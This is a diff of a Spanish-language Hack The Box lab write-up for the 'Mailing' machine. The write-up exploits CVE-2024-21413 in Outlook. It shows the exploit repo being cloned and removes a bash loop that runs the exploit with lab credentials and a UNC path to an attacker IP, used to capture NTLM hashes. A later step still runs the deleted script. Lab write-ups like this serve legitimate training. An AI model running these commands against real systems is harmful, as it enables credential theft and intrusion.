@@ -143,7 +143,7 @@ LIST
 ```
 Teniendo las credenciales del usario 'administrator' puedo aprovechar la vulnerabilidad CVE-2024-21413.
 
-<https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413>
+<https://nvd.nist.gov/vuln/detail/CVE-2024-21413>
 
 ```terminal
 /home/kali/Documents/htb/machines/mailing:-$ git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability?tab=readme-ov-file
@@ -160,19 +160,8 @@ Teniendo las credenciales del usario 'administrator' puedo aprovechar la vulnera
 
 * El Responder debe estar correctamente configurado.
 
-En teoria con ejecutar el exploit una vez tendria que ser suficiente, pero la maquina no funciona muy bien. Asique cree un script para ejecutar el comando varias veces.
-```bash
-/home/kali/Documents/htb/machines/mailing:-$ nano script.sh
-	#!/bin/bash
-		# Definir el número de veces que deseas ejecutar el script
-	num_veces=50
-		# Bucle para ejecutar el exploit CVE-2024-21413.py, el numero de veces definido
-	for (( i=1; i<=$num_veces; i++ ))
-	do
-	    python CVE-2024-21413.py --server 10.10.11.14 --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.11.71/IPC$" --subject "open"
-		sleep 1  # Pausa de 1 segundo entre cada ejecución
-	done 
-```
+En teoria con ejecutar el exploit una vez tendria que ser suficiente, pero la maquina no funciona muy bien.
+
 ```terminal
 /home/kali/Documents/htb/machines/mailing:-$ ./script.sh
 ```
